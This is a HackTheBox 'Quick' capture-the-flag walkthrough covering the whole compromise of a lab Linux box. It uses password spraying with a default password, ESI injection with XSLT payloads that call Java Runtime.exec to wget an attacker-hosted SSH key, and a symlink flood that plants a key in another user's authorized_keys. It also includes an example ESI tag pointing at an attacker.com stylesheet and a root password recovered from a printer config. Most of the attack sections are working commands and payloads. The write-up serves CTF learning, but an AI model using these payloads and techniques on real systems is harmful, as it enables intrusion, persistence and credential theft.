# HackTheBox - Quick: Comprehensive Walkthrough

**Machine:** Quick  
**Difficulty:** Hard  
**OS:** Linux  
**IP (Target):** 10.129.2.152  
**IP (Attacker):** 10.10.14.6  

---

## Table of Contents

1. [Mindset & Methodology](#mindset--methodology)
2. [Phase 1: Enumeration](#phase-1-enumeration)
3. [Phase 2: Initial Foothold (User)](#phase-2-initial-foothold-user)
4. [Phase 3: Privilege Escalation to srvadm](#phase-3-privilege-escalation-to-srvadm)
5. [Phase 4: Root](#phase-4-root)
6. [Key Lessons & Takeaways](#key-lessons--takeaways)

---

## Mindset & Methodology

Before touching a single command, understand the **hacker's mindset** for this box:

> **"The box is called Quick. The name is a hint."**

On HackTheBox, machine names are rarely random. "Quick" hints at speed, but more importantly, it hints at **HTTP/3** and the **QUIC protocol** — both designed for speed. When you see an HTTPS link that doesn't work on standard TCP port 443, you must ask: *"What if this isn't broken? What if it's just speaking a protocol I haven't checked yet?"*

The core methodology for this box is:
1. **Enumerate everything** — even the weird stuff (UDP ports, non-standard protocols).
2. **Follow the breadcrumbs** — PDFs, testimonials, and email addresses are not decoration; they are intel.
3. **Think like the developer** — they reused passwords, left debug headers (`X-Powered-By: Esigate`), and stored credentials in config files.
4. **Use the path of least resistance** — whenever possible, write your own access (SSH keys) instead of fighting with reverse shells.

---

## Phase 1: Enumeration

### Step 1.1: Hosts File Setup

**Command:**
```bash
echo -e "10.129.2.152\tquick.htb portal.quick.htb printerv2.quick.htb" | sudo tee -a /etc/hosts
```

**Why:**  
Web applications often use **virtual hosts** (vhosts). If you access a site by IP address alone, Apache/nginx serves the *default* virtual host. To reach `portal.quick.htb` or `printerv2.quick.htb`, your OS must resolve those domains to the target IP. Without this, you'll hit the wrong site or get connection errors.

**Hacker Mindset:**  
*Always map domains early.* The moment you see a link to `portal.quick.htb` on the main page, that domain becomes a target. Don't wait until you need it — set it up during initial recon.

---

### Step 1.2: Nmap (What We Expect)

A standard `nmap -sC -sV` scan reveals:
- **Port 22/tcp** — SSH (OpenSSH 7.6p1)
- **Port 9001/tcp** — Apache httpd 2.4.29

**Why:**  
Port 9001 is non-standard for HTTP. This tells us the admin deliberately chose not to use port 80/8080. Why? Probably to hide something, or because port 80 is reserved for an internal service (spoiler: it is).

**Hacker Mindset:**  
*Non-standard ports are invitations to dig deeper.* They suggest custom configuration, potential misconfiguration, or hidden services. Also, SSH on port 22 is "boring" until you have credentials — so prioritize the webapp.

---

### Step 1.3: The Broken HTTPS Link

Browsing `http://quick.htb:9001`, you see a link to `https://portal.quick.htb`. Clicking it fails. TCP port 443 is not open in your nmap scan.

**Why:**  
Browsers speak HTTP over TCP. If the server only speaks HTTP/3 (which uses **UDP**), the browser cannot connect. The box name "Quick" + a broken HTTPS link = **QUIC/HTTP/3**.

**Hacker Mindset:**  
*When something looks broken, ask if you're speaking the wrong language.* The site isn't broken; your tools are. This is a critical pivot point. Most attackers give up here. You won't.

---

### Step 1.4: UDP Scan

**Command:**
```bash
sudo nmap -sU -p 443 10.129.2.152
```

**Result:**  
UDP port 443 is `open|filtered`.

**Why:**  
Nmap's default is TCP. UDP scans are slower and often ignored, but HTTP/3 (QUIC) explicitly uses **UDP 443**. This confirms our hypothesis.

**Hacker Mindset:**  
*TCP is not the only protocol.* Modern applications (DNS, QUIC, VPNs) live on UDP. If a box feels "empty" after a TCP scan, you're not done. The best hints are often on UDP.

---

### Step 1.5: Accessing HTTP/3 with curl

**Command:**
```bash
curl --http3 -k https://portal.quick.htb/
```

**Why:**  
Modern curl (8.x+) ships with `ngtcp2` and `nghttp3`, enabling native HTTP/3 support. The `--http3` flag forces curl to speak QUIC. `-k` ignores the self-signed certificate. Without this, you cannot reach the portal.

**Result:**  
The portal loads. Inside:
- `index.php?view=about` → reveals email addresses (`jane@quick.htb`, `mike@quick.htb`, `john@quick.htb`)
- `index.php?view=docs` → links to PDFs: `QuickStart.pdf` and `Connectivity.pdf`

**Hacker Mindset:**  
*Use the right tool for the protocol.* Don't spend hours compiling `quiche` or `aioquic` if your system curl already supports HTTP/3. Check your tools first.

---

### Step 1.6: Downloading and Analyzing PDFs

**Commands:**
```bash
curl --http3 -k https://portal.quick.htb/docs/Connectivity.pdf -o /tmp/Connectivity.pdf
pdftotext /tmp/Connectivity.pdf -
```

**Result:**  
The PDF contains the default customer password: **`Quick4cc3$$`**

**Why:**  
Documentation, onboarding PDFs, and "getting started" guides are goldmines. Companies often include default credentials, WiFi passwords, or internal URLs. Never skip the boring documents.

**Hacker Mindset:**  
*Users are lazy.* If the ISP gives customers a default password, at least one customer hasn't changed it. Our job is to find that customer.

---

### Step 1.7: Building a User List

From the main site (`http://quick.htb:9001`):
- **Testimonials** reveal names + companies:
  - Tim (Qconsulting Pvt Ltd) — UK
  - Roy (DarkWng Solutions) — US
  - Elisa (Wink Media) — UK
  - James (LazyCoop Pvt Ltd) — China
- **Clients page** confirms countries.

**Email candidates:**
```
elisa@wink.co.uk
tim@Qconsulting.co.uk
james@lazycoop.co.cn
roy@DarkWng.com
jane@quick.htb
mike@quick.htb
john@quick.htb
```

**Why:**  
The testimonials and client list are not fluff. They provide **real names** and **company domains**. Correlating country + company + name lets us guess email formats. The UK pricing (£) suggests UK TLDs (`.co.uk`) are most likely.

**Hacker Mindset:**  
*OSINT is enumeration.* You don't need a vulnerability to break in if you can guess a valid username. Social engineering and pattern matching are legitimate attack vectors.

---

### Step 1.8: Password Spraying

**Command:**
```bash
curl -s -D - -X POST -d 'email=elisa@wink.co.uk&password=Quick4cc3$$' http://quick.htb:9001/login.php
```

**Result:**  
HTTP 302 Found with `Set-Cookie: PHPSESSID=...`

**Why:**  
Instead of brute-forcing thousands of passwords against one user, we try **one password against many users**. This is called **password spraying**. It's stealthy and effective because users reuse passwords.

**Hacker Mindset:**  
*Work smart, not hard.* One correct guess is worth more than a million wrong guesses. Default passwords work more often than you'd think.

---

### Step 1.9: Discovering the ESI Header

While proxying requests through Burp, notice:
```
X-Powered-By: Esigate
```

**Why:**  
`Esigate` is a web application integration gateway that supports **Edge Side Includes (ESI)**. ESI allows dynamic assembly of web pages from multiple sources. If user input is reflected into an ESI-enabled response, we can inject ESI tags to make the server fetch and execute arbitrary resources.

**Hacker Mindset:**  
*Unusual headers are cheat codes.* `X-Powered-By` often reveals the exact software and version. When you see something you've never heard of, Google it immediately. Every unknown technology is a potential vulnerability.

---

## Phase 2: Initial Foothold (User)

### Step 2.1: Understanding ESI Injection

ESI tags look like XML:
```xml
<esi:include src="http://attacker.com/evil.xml" stylesheet="http://attacker.com/evil.xsl"/>
```

**Why it works:**  
When Esigate parses this tag, it fetches `evil.xml` and applies the XSL stylesheet `evil.xsl`. The XSL can contain executable code using Java extensions (`java.lang.Runtime`), giving us **Remote Code Execution (RCE)**.

**Hacker Mindset:**  
*Abuse the parser.* The server trusts ESI tags because they're supposed to be internal. If you can inject them into user-facing content (like a ticket description), the server becomes your puppet.

---

### Step 2.2: Preparing the Payload Server

**Commands:**
```bash
mkdir -p /tmp/quick_exploit
cp ~/.ssh/quick_rsa.pub /tmp/quick_exploit/
cd /tmp/quick_exploit && python3 -m http.server 8000 > /dev/null 2>&1 &
```

**Why:**  
The target needs to fetch our malicious XML/XSL files and our SSH public key. A simple Python HTTP server on our attack box is the fastest way to serve these.

**Hacker Mindset:**  
*Always prepare your infrastructure before firing the exploit.* You don't want to scramble to start a server while your payload is already in flight.

---

### Step 2.3: Generating an SSH Keypair

**Command:**
```bash
ssh-keygen -t rsa -f ~/.ssh/quick_rsa -N ""
```

**Why:**  
Instead of fighting with reverse shells (which often die, have no TTY, or fail behind firewalls), we **write our own access**. Dropping an SSH public key into a user's `authorized_keys` gives us a stable, interactive shell.

**Hacker Mindset:**  
*Prefer persistent access over one-shot shells.* A reverse shell is a conversation; an SSH key is a key to the house. Always choose the latter when possible.

---

### Step 2.4: Crafting the XSL Payloads

We need **two separate tickets** because `Runtime.exec()` chokes on complex shell syntax like `&&` and pipes. Simple commands work.

**Ticket 1 — Create the `.ssh` directory:**
```xml
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <root>
    <xsl:variable name="cmd"><![CDATA[mkdir -p /home/sam/.ssh]]></xsl:variable>
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
    Process: <xsl:value-of select="$process"/>
  </root>
</xsl:template>
</xsl:stylesheet>
```

**Ticket 2 — Download the SSH key:**
```xml
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <root>
    <xsl:variable name="cmd"><![CDATA[wget http://10.10.14.6:8000/quick_rsa.pub -O /home/sam/.ssh/authorized_keys]]></xsl:variable>
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
    Process: <xsl:value-of select="$process"/>
  </root>
</xsl:template>
</xsl:stylesheet>
```

**Why:**  
The `xmlns:rt` namespace imports `java.lang.Runtime`. `rt:getRuntime()` gets the runtime object, and `rt:exec()` executes a system command. The CDATA section protects special XML characters.

**Critical Lesson:**  
We initially tried `bash -c "mkdir -p /home/sam/.ssh && wget ..."` but `Runtime.exec()` tokenizes arguments differently than a shell. Pipes, redirects, and `&&` break. **Simple commands only.**

**Hacker Mindset:**  
*Know your execution context.* A command that works in `bash` may fail in `Runtime.exec()`, `system()`, or `execve()`. Test simple primitives first.

---

### Step 2.5: Submitting Malicious Tickets

**Ticket 1:**
```bash
curl -s -b 'PHPSESSID=YOUR_COOKIE' -X POST \
  -d 'title=mkdir&msg=<esi:include src="http://10.10.14.6:8000/mkdir.xml" stylesheet="http://10.10.14.6:8000/mkdir.xsl"></esi:include>&id=TKT-7332' \
  http://quick.htb:9001/ticket.php
```

**Trigger Ticket 1:**
```bash
curl -s -b 'PHPSESSID=YOUR_COOKIE' 'http://quick.htb:9001/search.php?search=7332'
```

**Ticket 2:**
```bash
curl -s -b 'PHPSESSID=YOUR_COOKIE' -X POST \
  -d 'title=wget&msg=<esi:include src="http://10.10.14.6:8000/wget.xml" stylesheet="http://10.10.14.6:8000/wget.xsl"></esi:include>&id=TKT-7333' \
  http://quick.htb:9001/ticket.php
```

**Trigger Ticket 2:**
```bash
curl -s -b 'PHPSESSID=YOUR_COOKIE' 'http://quick.htb:9001/search.php?search=7333'
```

**Why:**  
The ticket submission stores the ESI payload in the database. The **search** function retrieves the ticket and reflects it into the page. Esigate parses the ESI tag, fetches our XSL, and executes the command.

**Hacker Mindset:**  
*Find the reflection point.* Stored XSS/ESI is useless until it's rendered. The search page is the trigger.

---

### Step 2.6: SSH as Sam

**Command:**
```bash
ssh -i ~/.ssh/quick_rsa sam@quick.htb
```

**Result:**  
Shell as `sam`. Grab the user flag:
```bash
cat ~/user.txt
```

**Why:**  
Stable shell, full TTY, no netcat juggling. This is the reward for choosing the SSH key route.

---

## Phase 3: Privilege Escalation to srvadm

### Step 3.1: MySQL Enumeration

**Command:**
```bash
cat /var/www/html/db.php
```

**Result:**
```php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
```

**Why:**  
Database credentials are often hardcoded in PHP includes. `db.php` is a classic target. Once you have DB access, you own the application's authentication layer.

**Hacker Mindset:**  
*Config files are confessionals.* Developers store secrets in plain text because it's convenient. Always grep for `password`, `secret`, and `key` in web roots.

---

### Step 3.2: Extracting srvadm's Hash

**Command:**
```bash
mysql -u db_adm -p quick -e "select email,password from users where email='srvadm@quick.htb';"
```

**Result:**
```
| srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
```

**Why:**  
The `users` table contains password hashes. For `srvadm`, the hash is `e626d51f8fbfd1124fdea88396c35d05`. The login logic uses `md5(crypt($password,'fa'))`.

**Important Distinction:**  
This is the **web application password**, not the Linux system password. `su srvadm` uses `/etc/shadow`, which is different. We cannot `su` with this password. But we *can* use it to login to the printer management interface.

**Hacker Mindset:**  
*Distinguish application credentials from OS credentials.* Just because a password unlocks a web app doesn't mean it unlocks the shell. Map each credential to its scope.

---

### Step 3.3: Accessing the Internal Printer Interface

From Apache config (`/etc/apache2/sites-enabled/000-default.conf`):
```apache
<VirtualHost *:80>
    AssignUserId srvadm srvadm
    ServerName printerv2.quick.htb
    DocumentRoot /var/www/printer
</VirtualHost>
```

**Why:**  
Port 80 is only bound to `127.0.0.1`. From our shell as `sam`, we can access it via `curl -H 'Host: printerv2.quick.htb' http://127.0.0.1:80/`. The `AssignUserId srvadm srvadm` directive means this vhost runs as `srvadm` — critical for privilege escalation.

**Hacker Mindset:**  
*Internal services are soft targets.* Just because a port isn't exposed externally doesn't mean it's secure. Once you're inside, localhost becomes a goldmine.

---

### Step 3.4: Understanding the Printer Exploit

The printer interface (`/var/www/printer/job.php`) does the following:

```php
$file = date("Y-m-d_H:i:s");
file_put_contents("/var/www/jobs/".$file, $_POST["desc"]);
chmod("/var/www/printer/jobs/".$file, "0777");  // BUG: wrong path!
$stmt = $conn->prepare("select ip,port from jobs");
...
$printer -> text(file_get_contents("/var/www/jobs/".$file));
...
unlink("/var/www/jobs/".$file);
```

**The Bug:**  
`file_put_contents` writes to `/var/www/jobs/`, but `chmod` tries `/var/www/printer/jobs/` (which doesn't exist). The file is created with default permissions.

**The Exploit:**  
`/var/www/jobs` is **world-writable** (`drwxrwxrwx`). If we create a **symlink** in `/var/www/jobs/` with the same name as the timestamp `job.php` will use, `file_put_contents` will **follow the symlink** and write our data to wherever it points.

We point the symlink to `/home/srvadm/.ssh/authorized_keys`. When the admin submits a print job containing our SSH public key, our key gets written to srvadm's authorized keys.

**Why this works:**  
`file_put_contents()` follows symlinks. The write happens **before** the network connection to the printer. Even if the printer is offline, the write succeeds.

**Hacker Mindset:**  
*Race conditions favor the prepared.* Instead of trying to swap the file after creation (which is a narrow window), we **pre-place** symlinks for every second in the next minute. When the job fires, one of our symlinks matches the timestamp. We turn a race into a near-certainty.

---

### Step 3.5: Executing the Symlink Flood + Print Job

**On the target (as `sam`):**

```bash
# Login to printer interface
curl -s -c /tmp/printer_cookies.txt -H 'Host: printerv2.quick.htb' \
  -X POST -d 'email=srvadm@quick.htb&password=yl51pbx' \
  http://127.0.0.1:80/index.php

# Add a fake printer pointing back to our Kali box
curl -s -b /tmp/printer_cookies.txt -H 'Host: printerv2.quick.htb' \
  -X POST -d 'title=hack&type=network&profile=default&ip_address=10.10.14.6&port=9100&add_printer=' \
  http://127.0.0.1:80/add_printer.php

# Download our public key locally on the target
wget -qO /tmp/key.pub http://10.10.14.6:8000/quick_rsa.pub

# Flood /var/www/jobs with symlinks for every second in the next 60 seconds
for i in $(seq 0 59); do
  t=$(date -d "+$i seconds" +"%Y-%m-%d_%H:%M:%S")
  ln -sf /home/srvadm/.ssh/authorized_keys /var/www/jobs/$t
done

# Submit the print job with our key as the "document"
curl -s -b /tmp/printer_cookies.txt -H 'Host: printerv2.quick.htb' \
  -X POST --data-urlencode "title=hack" \
  --data-urlencode "desc@/tmp/key.pub" \
  --data-urlencode "submit=Print" \
  http://127.0.0.1:80/job.php
```

**Result:**  
The job returns "Can't connect to printer" (because our Kali box isn't listening on 9100), but `file_put_contents` has already executed. The key is now in `/home/srvadm/.ssh/authorized_keys`.

**Hacker Mindset:**  
*You don't need the printer to work; you only need the file write.* Error messages are noise. Focus on the side effects.

---

### Step 3.6: SSH as srvadm

**Command:**
```bash
ssh -i ~/.ssh/quick_rsa srvadm@quick.htb
```

**Result:**  
Shell as `srvadm`.

**Why:**  
The symlink trick gave us write access to srvadm's `authorized_keys` because the printer job ran as `srvadm` (per the Apache `AssignUserId` directive).

**Hacker Mindset:**  
*Abuse process identity.* When a service runs as a specific user, any file operation it performs inherits that user's privileges. If you can control the filename (via symlink), you control where the data lands.

---

## Phase 4: Root

### Step 4.1: Finding the Root Password

**Command:**
```bash
cat ~/.cache/conf.d/printers.conf
```

**What we find:**
```
DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
```

**Decoding:**
- `%40` → `@`
- `%26` → `&`
- `%3F` → `?`

**Decoded URL:**
```
https://srvadm@quick.htb:&ftQ4K3SGde8?@printerv3.quick.htb/printer
```

**Why:**  
In URL syntax, `https://username:password@host/path` embeds credentials. The printer configuration file contains the plaintext password for `printerv3.quick.htb`. The username is `srvadm@quick.htb` and the password is `&ftQ4K3SGde8?`.

**Hacker Mindset:**  
*Config files are the gift that keeps on giving.* Even after you've compromised a user, always grep their home directory for `.conf`, `.ini`, `.xml`, and cache files. Admins often reuse passwords across services.

---

### Step 4.2: Becoming Root

**Command:**
```bash
su - root
```

**Password:** `&ftQ4K3SGde8?`

**Result:**  
Root shell.

**Command:**
```bash
cat /root/root.txt
```

**Hacker Mindset:**  
*Password reuse is the ultimate shortcut.* The root password was sitting in a printer config file, URL-encoded but otherwise naked. Once you find one password, always try it everywhere — especially `su`, `sudo`, and other services.

---

## Key Lessons & Takeaways

| Lesson | Application |
|--------|-------------|
| **Protocol awareness** | HTTP/3 over UDP 443 was the gate to the portal. TCP-only thinking would miss it entirely. |
| **OSINT from public content** | Testimonials and PDFs gave us usernames, companies, and a default password. |
| **Password spraying > brute force** | One password against many users is stealthy and effective. |
| **Unusual headers reveal tech stacks** | `X-Powered-By: Esigate` led directly to the ESI injection vulnerability. |
| **Simple commands in RCE** | `Runtime.exec()` is not a shell. Avoid pipes, redirects, and `&&`. |
| **Symlink attacks exploit file writes** | If you control the filename and the directory is writable, symlinks let you write anywhere the process can reach. |
| **SSH keys > reverse shells** | Dropping a key gives persistent, stable, interactive access. |
| **Config files contain secrets** | `.cache/conf.d/printers.conf` had the root password in plain sight. |
| **Always check localhost** | Internal vhosts and services on 127.0.0.1 are often less hardened than external ones. |

---

**Flags:**
- **User:** `655e0[redacted]c61d65a2`
- **Root:** `7a5b9[redacted]fc241ab5fc`
